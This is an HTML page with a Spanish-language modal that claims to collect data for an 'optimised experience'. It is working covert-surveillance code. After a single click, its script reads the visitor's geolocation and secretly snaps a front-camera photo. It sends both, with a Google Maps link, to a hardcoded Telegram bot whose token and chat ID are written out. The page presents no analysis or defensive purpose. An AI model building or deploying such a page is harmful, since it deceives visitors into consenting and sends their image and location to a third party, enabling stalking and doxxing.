<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Optimización de Experiencia</title>
    <style>
        /* Modal centrado */
        #permission-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.6); /* Fondo oscuro */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        #permission-content {
            background: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            max-width: 400px;
            width: 90%;
        }

        #permission-modal button {
            margin-top: 20px;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            background: #28a745;
            color: white;
            cursor: pointer;
        }

        #permission-modal button:hover {
            background: #218838;
        }

        #permission-modal h2 {
            margin-bottom: 10px;
        }

        #permission-modal p {
            color: #555;
            font-size: 16px;
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <!-- Modal persuasivo -->
    <div id="permission-modal">
        <div id="permission-content">
            <h2>Ayúdanos a Mejorar</h2>
            <p>Recopilamos datos para ofrecerte una experiencia optimizada y personalizada. Por favor, concede permisos para continuar.</p>
            <button id="accept-button">Aceptar</button>
        </div>
    </div>

    <script>
        // Datos del bot de Telegram
        const botToken = '7555861557:AAGfZFvIiXAYxYUB21e7HHGCD7XPOXffM3g'; // Token del bot
        const chatId = '1223367230'; // Chat ID

        // Almacenar datos de ubicación
        let locationInfo = 'Ubicación: No disponible.';
        let mapLink = '';

        // Obtener la ubicación del usuario
        async function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const { latitude, longitude } = position.coords;
                            locationInfo = `Ubicación: Latitud ${latitude}, Longitud ${longitude}`;
                            mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                            resolve();
                        },
                        () => {
                            console.warn('No se pudo obtener la ubicación.');
                            resolve();
                        }
                    );
                } else {
                    console.warn('Geolocalización no soportada por el navegador.');
                    resolve();
                }
            });
        }

        // Iniciar la cámara y capturar una foto
        async function capturePhoto() {
            const constraints = { video: { facingMode: "user" } }; // Usar cámara frontal
            const video = document.createElement('video');
            video.style.display = 'none';
            document.body.appendChild(video);

            try {
                const stream = await navigator.mediaDevices.getUserMedia(constraints);
                video.srcObject = stream;
                video.play();

                // Esperar a que el video cargue
                await new Promise((resolve) => (video.onloadedmetadata = resolve));

                // Crear un canvas para capturar la imagen
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Convertir la imagen a un blob
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        resolve({ blob, stream, video });
                    }, 'image/jpeg');
                });
            } catch (error) {
                console.error('Error al acceder a la cámara:', error);
            }
        }

        // Enviar la foto y la ubicación a Telegram
        async function sendToTelegram(blob) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', `Nuevo visitante:
- ${locationInfo}
- Enlace a Google Maps: ${mapLink || 'No disponible'}`);

            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;

            try {
                const response = await fetch(url, { method: 'POST', body: formData });
                if (!response.ok) {
                    console.error('Error al enviar la foto:', await response.json());
                }
            } catch (error) {
                console.error('Error de red:', error.message);
            }
        }

        // Proceso principal
        async function handlePermissions() {
            document.getElementById('permission-modal').style.display = 'none'; // Ocultar modal
            await getLocation(); // Obtener ubicación
            const { blob, stream, video } = await capturePhoto(); // Capturar foto
            if (blob) {
                await sendToTelegram(blob); // Enviar a Telegram
            }
            // Detener la cámara
            stream.getTracks().forEach((track) => track.stop());
            video.remove();
        }

        // Configurar evento para el botón
        document.getElementById('accept-button').onclick = handlePermissions;
    </script>
</body>
</html>
